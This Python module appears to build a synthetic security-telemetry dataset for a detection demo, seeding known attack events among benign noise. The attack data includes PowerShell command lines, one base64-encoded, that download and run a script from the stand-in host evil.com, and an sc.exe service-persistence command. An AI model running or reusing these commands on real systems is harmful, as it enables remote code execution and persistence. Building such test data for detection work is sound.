"""Telemetry ingestion.

Two paths:

1. ``generate_synthetic_dataset`` — deterministic fake Windows process, auth,
   and AWS CloudTrail events seeded with known attacks (brute force, encoded
   PowerShell, new service, unusual S3 egress) buried in benign noise. Used
   for the local demo, tests, and CI.
2. ``load_mordor`` — documented extension point for real OTRF / Mordor
   Security-Datasets. Kept as a NotImplementedError by default so the demo
   never depends on network access.
"""

from __future__ import annotations

import json
import random
import uuid
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path

import duckdb

SYNTHETIC_SEED = 42
BASE_TIME = datetime(2026, 4, 20, 9, 0, 0, tzinfo=UTC)

BENIGN_WINDOWS = 150
BENIGN_AUTH = 150
BENIGN_CT = 150


@dataclass
class DatasetStats:
    per_table: dict[str, int] = field(default_factory=dict)
    output_dir: Path = Path(".")

    @property
    def total_events(self) -> int:
        return sum(self.per_table.values())


def _iso(ts: datetime) -> str:
    return ts.astimezone(UTC).isoformat()


# ---------- Windows process creation ----------

def _benign_windows(rng: random.Random) -> list[dict]:
    hosts = ["WKST-ALICE-01", "WKST-BOB-02", "SRV-DB-01", "SRV-WEB-01", "WKST-ENG-03"]
    users = ["alice", "bob", "svc_sql", "svc_web", "carol"]
    pairs = [
        (r"C:\Windows\explorer.exe", r"C:\Program Files\Google\Chrome\Application\chrome.exe",
         r'"chrome.exe" --single-argument https://example.com'),
        (r"C:\Windows\explorer.exe", r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
         r'"WINWORD.EXE" /n "C:\Users\alice\Documents\q3-report.docx"'),
        (r"C:\Windows\System32\cmd.exe", r"C:\Windows\System32\ipconfig.exe", "ipconfig /all"),
        (r"C:\Windows\System32\services.exe", r"C:\Windows\System32\svchost.exe",
         r"C:\Windows\System32\svchost.exe -k NetworkService"),
        (r"C:\Windows\explorer.exe", r"C:\Program Files\Git\cmd\git.exe", "git status"),
        (r"C:\Windows\System32\cmd.exe", r"C:\Windows\System32\tasklist.exe", "tasklist /v"),
        (r"C:\Windows\System32\cmd.exe", r"C:\Windows\System32\whoami.exe", "whoami /groups"),
    ]
    events: list[dict] = []
    for i in range(BENIGN_WINDOWS):
        parent, image, cmdline = rng.choice(pairs)
        ts = BASE_TIME + timedelta(seconds=rng.randint(0, 6 * 3600))
        events.append({
            "timestamp": _iso(ts),
            "hostname": rng.choice(hosts),
            "EventID": 1,
            "Image": image,
            "CommandLine": cmdline,
            "ParentImage": parent,
            "ParentCommandLine": "",
            "User": rng.choice(users),
            # Deterministic AND valid UUID5 (raw 128 random bits do not set
            # version/variant bits and produce non-conformant UUIDs).
            "ProcessGuid": str(uuid.uuid5(uuid.NAMESPACE_DNS, f"benign-windows-{i}")),
            "ProcessId": rng.randint(1000, 9999),
        })
    return events


def _attack_windows() -> list[dict]:
    """Windows attack events (known TPs)."""
    return [
        # T1059.001: PowerShell encoded command (Empire-style)
        {
            "timestamp": _iso(BASE_TIME + timedelta(minutes=17)),
            "hostname": "WKST-ALICE-01",
            "EventID": 1,
            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": (
                "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand "
                "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABp"
                "AGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAA"
                "OgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAuAHAAcwAxACIAKQA="
            ),
            "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            "ParentCommandLine": r'"WINWORD.EXE" /n "C:\Users\alice\Downloads\invoice.docx"',
            "User": "alice",
            "ProcessGuid": str(uuid.uuid5(uuid.NAMESPACE_DNS, "attack-ps-encoded")),
            "ProcessId": 4242,
        },
        # T1543.003: New service install via sc.exe
        {
            "timestamp": _iso(BASE_TIME + timedelta(minutes=22)),
            "hostname": "SRV-DB-01",
            "EventID": 1,
            "Image": r"C:\Windows\System32\sc.exe",
            "CommandLine": (
                r'sc.exe create "WindowsTelemetryHelper" '
                r'binPath= "C:\ProgramData\wtelem.exe" start= auto'
            ),
            "ParentImage": r"C:\Windows\System32\cmd.exe",
            "ParentCommandLine": "cmd.exe /c persist.bat",
            "User": "svc_sql",
            "ProcessGuid": str(uuid.uuid5(uuid.NAMESPACE_DNS, "attack-new-service")),
            "ProcessId": 5555,
        },
        # T1059 unusual lineage: winword → powershell
        {
            "timestamp": _iso(BASE_TIME + timedelta(minutes=34)),
            "hostname": "WKST-BOB-02",
            "EventID": 1,
            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": (
                'powershell.exe -Command "IEX (New-Object Net.WebClient).'
                'DownloadString(\\"http://evil.com/s.ps1\\")"'
            ),
            "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            "ParentCommandLine": r'"WINWORD.EXE" /n "C:\Users\bob\Downloads\resume.docx"',
            "User": "bob",
            "ProcessGuid": str(uuid.uuid5(uuid.NAMESPACE_DNS, "attack-unusual-lineage")),
            "ProcessId": 6666,
        },
    ]


# ---------- Authentication ----------

def _benign_auth(rng: random.Random) -> list[dict]:
    users = ["alice", "bob", "carol", "dave", "admin"]
    ips = ["10.0.1.15", "10.0.2.22", "192.168.1.100", "172.16.4.33"]
    events: list[dict] = []
    for _ in range(BENIGN_AUTH):
        ts = BASE_TIME + timedelta(seconds=rng.randint(0, 6 * 3600))
        events.append({
            "timestamp": _iso(ts),
            "hostname": "AUTH-SVC-01",
            "username": rng.choice(users),
            "result": "success" if rng.random() > 0.05 else "failure",
            "source_ip": rng.choice(ips),
            "auth_type": rng.choice(["password", "mfa", "key"]),
        })
    return events


def _attack_auth() -> list[dict]:
    """T1110: 50 failed logins for admin from one IP inside ~60s."""
    attack_ip = "185.220.101.45"
    start = BASE_TIME + timedelta(minutes=45)
    return [
        {
            "timestamp": _iso(start + timedelta(seconds=i)),
            "hostname": "AUTH-SVC-01",
            "username": "admin",
            "result": "failure",
            "source_ip": attack_ip,
            "auth_type": "password",
        }
        for i in range(50)
    ]


# ---------- AWS CloudTrail ----------

def _benign_cloudtrail(rng: random.Random) -> list[dict]:
    names = ["DescribeInstances", "ListBuckets", "GetObject", "DescribeVolumes", "GetCallerIdentity"]
    sources = {
        "DescribeInstances": "ec2.amazonaws.com",
        "ListBuckets": "s3.amazonaws.com",
        "GetObject": "s3.amazonaws.com",
        "DescribeVolumes": "ec2.amazonaws.com",
        "GetCallerIdentity": "sts.amazonaws.com",
    }
    users = ["dev-alice", "dev-bob", "ops-carol"]
    ips = ["10.0.5.12", "10.0.5.13", "54.201.100.5"]
    events: list[dict] = []
    for _ in range(BENIGN_CT):
        name = rng.choice(names)
        ts = BASE_TIME + timedelta(seconds=rng.randint(0, 6 * 3600))
        events.append({
            "timestamp": _iso(ts),
            "eventName": name,
            "eventSource": sources[name],
            "userIdentity_userName": rng.choice(users),
            "userIdentity_type": "IAMUser",
            "sourceIPAddress": rng.choice(ips),
            "awsRegion": rng.choice(["us-east-1", "us-west-2"]),
            "requestParameters": "{}",
            "responseElements": "{}",
            "errorCode": None,
            "bytes_out": rng.randint(100, 1_000_000),
        })
    return events


def _attack_cloudtrail() -> list[dict]:
    """T1078 unusual IAM policy change + T1567.002 S3 egress burst."""
    iam_attack = {
        "timestamp": _iso(BASE_TIME + timedelta(minutes=58)),
        "eventName": "AttachUserPolicy",
        "eventSource": "iam.amazonaws.com",
        "userIdentity_userName": "dev-bob",
        "userIdentity_type": "IAMUser",
        "sourceIPAddress": "185.220.101.45",
        "awsRegion": "us-east-1",
        "requestParameters": json.dumps(
            {"userName": "dev-bob", "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}
        ),
        "responseElements": "{}",
        "errorCode": None,
        "bytes_out": 120,
    }
    egress_start = BASE_TIME + timedelta(minutes=72)
    egress = [
        {
            "timestamp": _iso(egress_start + timedelta(seconds=i * 2)),
            "eventName": "GetObject",
            "eventSource": "s3.amazonaws.com",
            "userIdentity_userName": "dev-bob",
            "userIdentity_type": "IAMUser",
            "sourceIPAddress": "185.220.101.45",
            "awsRegion": "us-east-1",
            "requestParameters": json.dumps(
                {"bucketName": "acme-customer-pii", "key": f"exports/{i}.csv"}
            ),
            "responseElements": "{}",
            "errorCode": None,
            "bytes_out": 200_000_000,
        }
        for i in range(25)
    ]
    return [iam_attack, *egress]


# ---------- Public API ----------

def generate_synthetic_dataset(data_dir: Path, seed: int = SYNTHETIC_SEED) -> DatasetStats:
    """Materialize three Parquet tables under ``data_dir``. Deterministic given seed."""
    data_dir.mkdir(parents=True, exist_ok=True)
    rng = random.Random(seed)

    tables: dict[str, list[dict]] = {
        "windows_process_creation": _benign_windows(rng) + _attack_windows(),
        "authentication": _benign_auth(rng) + _attack_auth(),
        "aws_cloudtrail": _benign_cloudtrail(rng) + _attack_cloudtrail(),
    }

    stats = DatasetStats(output_dir=data_dir)
    con = duckdb.connect(":memory:")
    try:
        for name, events in tables.items():
            rng.shuffle(events)  # blend attacks into benign noise
            jsonl = data_dir / f"{name}.jsonl"
            with jsonl.open("w") as f:
                for e in events:
                    f.write(json.dumps(e) + "\n")
            parquet = data_dir / f"{name}.parquet"
            # DuckDB's COPY TO target does not reliably accept prepared-statement
            # parameters, so use the relation API + write_parquet instead.
            # Cast timestamp to real TIMESTAMP so downstream SQL can use time arithmetic.
            safe_jsonl = str(jsonl).replace("'", "''")
            rel = con.sql(
                f"SELECT * REPLACE (CAST(timestamp AS TIMESTAMP) AS timestamp) "
                f"FROM read_json_auto('{safe_jsonl}', format='newline_delimited')"
            )
            rel.write_parquet(str(parquet))
            stats.per_table[name] = len(events)
    finally:
        con.close()
    return stats


def load_mordor(scenario: str, data_dir: Path) -> None:
    """Extension point for real OTRF/Mordor Security-Datasets ingestion.

    Intentionally unimplemented so the demo works offline. To add a real
    scenario, download the NDJSON log bundle (e.g. from
    https://github.com/OTRF/Security-Datasets), normalize fields to match
    our table schemas, and reuse the JSONL→Parquet conversion pattern from
    ``generate_synthetic_dataset``.
    """
    raise NotImplementedError(
        f"Mordor scenario {scenario!r} is not implemented in this demo. "
        "Use generate_synthetic_dataset() for the local run."
    )
